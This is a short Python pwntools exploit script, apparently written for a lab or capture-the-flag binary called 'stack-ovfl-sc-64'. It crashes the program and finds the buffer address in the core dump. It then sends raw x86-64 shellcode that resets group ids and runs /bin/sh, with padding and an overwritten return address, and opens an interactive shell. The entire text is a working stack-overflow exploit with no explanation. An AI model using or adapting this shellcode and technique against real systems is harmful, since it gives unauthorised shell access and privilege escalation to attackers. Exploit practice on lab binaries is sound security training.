#!/usr/bin/env python

import sys
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

tag = b'12345678'

crash_payload = tag + cyclic(240)
p1 = process('./stack-ovfl-sc-64', env={})
p1.sendline(crash_payload)
p1.wait()

core = Coredump('./core')
addr = core.stack.find(tag)

shellcode = b'\x6a\x6c\x58\x0f\x05\x48\x89\xc7\x48\x89\xc6\x6a\x72\x58\x0f\x05\x48\x31\xf6\x48\x31\xd2\x52\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x51\x6a\x3b\x58\x48\x89\xe7\x0f\x05\x55'

payload = shellcode + cyclic(109) + p64(addr)

p = process('./stack-ovfl-sc-64', env={})
p.sendline(payload)

p.wait(0.1)
p.interactive()
